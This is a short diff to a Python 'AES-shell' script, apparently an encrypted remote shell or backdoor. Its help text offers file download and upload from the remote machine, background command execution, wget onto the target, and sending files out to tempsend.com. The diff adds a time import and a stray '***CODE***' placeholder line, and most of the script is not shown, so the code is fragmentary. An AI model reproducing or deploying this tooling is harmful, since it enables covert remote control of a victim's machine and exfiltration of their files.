@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 from Crypto.Cipher import AES
 from Crypto import Random
-import socket,base64,os,sys,string,random
+import socket,base64,os,sys,string,random,time
 try:
 	import readline
 except:
@@ -134,6 +134,7 @@ def fhelp():
 		return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n  tempsend file       -  Upload a file from remote pwd to tempsend.com**n'
 
 
+***CODE***
 BLOCK_SIZE, PADDING, cfrom, pwd = 32, '{', ' ', ''
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
@@ -152,7 +153,6 @@ except:
 c.listen(128)
 c.settimeout(30)
 fmainloop(True)
-
 while True:
 	try:
 		data = s.recv(8192)
